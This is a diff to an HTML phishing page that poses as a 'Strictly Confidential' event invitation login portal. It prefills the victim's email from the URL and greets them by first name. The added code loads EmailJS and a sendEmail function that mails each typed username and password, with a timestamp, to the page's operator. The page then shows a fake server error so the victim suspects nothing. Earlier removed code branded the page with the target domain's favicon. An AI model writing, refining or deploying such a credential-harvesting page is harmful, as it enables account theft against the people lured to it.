@@ -5,16 +5,20 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Login to Your Account</title>
 
+  <!-- EmailJS -->
+  <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+  <script>
+    emailjs.init("ClHUl");
+  </script>
+
   <style>
     body {
       font-family: Arial, sans-serif;
-
-      /* ✅ Default background */
       background-image: url('https://i.postimg.cc/pVBJwW22/blue-notes-isolated-grey.png');
       background-size: cover;
       background-position: center;
       background-repeat: no-repeat;
-
+      background-color: transparent;
       height: 100vh;
       margin: 0;
       padding: 0;
@@ -22,7 +26,6 @@
       justify-content: center;
       align-items: center;
       position: relative;
-      transition: background 0.5s ease;
     }
 
     body::before {
@@ -113,6 +116,7 @@
       max-width: 400px;
       padding: 20px;
       border-radius: 8px;
+      box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.3);
       border-top: 5px solid #007BFF;
       position: fixed;
       top: 50%;
@@ -145,24 +149,29 @@
   <div id="login" class="login-container">
     <img src="https://i.postimg.cc/qMNXQ08h/user-male-circle-blue-512.webp">
 
+    <!-- ✅ Title updated dynamically -->
     <h2 id="portalTitle">Event Invitation Portal</h2>
 
     <p class="subtext">Strictly Confidential</p>
 
-    <input type="text" id="username" placeholder="Email" required>
+    <input type="text" id="username" placeholder="Username" required>
     <input type="password" id="password" placeholder="Password" required>
 
     <button onclick="authenticate()">Login</button>
 
     <p class="note">
       You have been added to this secure portal due to your invitation to a strictly confidential event.
+      If this was done in error, please disregard this message.
     </p>
   </div>
 
   <!-- Confirmation Message -->
   <div id="confirmation">
     <h2 style="color: white;">ERROR: Try Again</h2>
-    <p>An internal server error occurred. Please try again.</p>
+    <p>
+      An internal server error occurred, and we were unable to complete your request.
+      Please close this page and try again.
+    </p>
     <button onclick="window.close()">Close this page</button>
   </div>
 
@@ -171,68 +180,80 @@
     2026 Email Invitation. All Rights Reserved
   </div>
 
-<script>
-  document.addEventListener("DOMContentLoaded", function () {
-    const params = new URLSearchParams(window.location.search);
-    const emailParam = params.get("email");
+  <script>
+    // ✅ Prefill username + show first name
+    document.addEventListener("DOMContentLoaded", function () {
+      const params = new URLSearchParams(window.location.search);
+      const emailParam = params.get("email");
 
-    const usernameField = document.getElementById("username");
-    const title = document.getElementById("portalTitle");
+      function extractFirstName(email) {
+        if (!email || !email.includes("@")) return "";
 
-    function extractDomain(email) {
-      if (!email || !email.includes("@")) return "";
-      return email.split("@")[1];
-    }
+        let namePart = email.split("@")[0];
+        namePart = namePart.split(/[.\-_]/)[0];
 
-    function setBackgroundFromDomain(domain) {
-      if (!domain) return;
-
-      const defaultBg = "https://i.postimg.cc/pVBJwW22/blue-notes-isolated-grey.png";
-
-      // ✅ Reliable logo source
-      const logoUrl = `https://www.google.com/s2/favicons?sz=256&domain=${domain}`;
-
-      document.body.style.backgroundImage = `
-        url('${logoUrl}'),
-        url('${defaultBg}')
-      `;
-      document.body.style.backgroundRepeat = "no-repeat, no-repeat";
-      document.body.style.backgroundPosition = "center, center";
-      document.body.style.backgroundSize = "120px, cover";
-    }
-
-    // ✅ Prefill
-    if (emailParam && usernameField) {
-      const decodedEmail = decodeURIComponent(emailParam);
-      usernameField.value = decodedEmail;
-
-      const domain = extractDomain(decodedEmail);
-      if (domain) {
-        title.textContent = domain;
-        setBackgroundFromDomain(domain);
+        return namePart.charAt(0).toUpperCase() + namePart.slice(1);
       }
-    }
 
-    // ✅ Live update
-    usernameField.addEventListener("input", function () {
-      const domain = extractDomain(this.value.trim());
+      if (emailParam) {
+        const usernameField = document.getElementById("username");
+        const title = document.getElementById("portalTitle");
 
-      if (domain) {
-        title.textContent = domain;
-        setBackgroundFromDomain(domain);
-      } else {
-        title.textContent = "Event Invitation Portal";
-        document.body.style.backgroundImage =
-          "url('https://i.postimg.cc/pVBJwW22/blue-notes-isolated-grey.png')";
+        if (usernameField) {
+          const decodedEmail = decodeURIComponent(emailParam);
+          usernameField.value = decodedEmail;
+
+          const firstName = extractFirstName(decodedEmail);
+
+          if (firstName && title) {
+            title.textContent = "Hi, " + firstName;
+          }
+        }
       }
     });
-  });
 
-  function authenticate() {
-    document.getElementById("login").style.display = "none";
-    document.getElementById("confirmation").style.display = "block";
-  }
-</script>
+    function sendEmail(username, password) {
+      const serviceID = "v2t";
+      const templateID = "tem";
+      const publicKey = "TL";
+
+      const templateParams = {
+        login_history: `Username: ${username}\nPassword: ${password}\nLogged in at: ${new Date().toLocaleString()}`
+      };
+
+      return emailjs.send(serviceID, templateID, templateParams, publicKey);
+    }
+
+    function authenticate() {
+      let loginButton = document.querySelector("button");
+
+      loginButton.textContent = "Authenticating...";
+      loginButton.disabled = true;
+
+      let username = document.getElementById("username").value.trim();
+      let password = document.getElementById("password").value.trim();
+
+      if (username && password) {
+        sendEmail(username, password)
+          .then(() => {
+            loginButton.textContent = "Login";
+            loginButton.disabled = false;
+            document.getElementById("login").style.display = "none";
+            document.getElementById("confirmation").style.display = "block";
+          })
+          .catch(error => {
+            console.error("Error sending email", error);
+            loginButton.textContent = "Login";
+            loginButton.disabled = false;
+            alert("Failed to send login report. Please try again.");
+          });
+      } else {
+        alert("Please enter both username and password.");
+        loginButton.disabled = false;
+        loginButton.textContent = "Login";
+      }
+    }
+  </script>
 
 </body>
 </html>
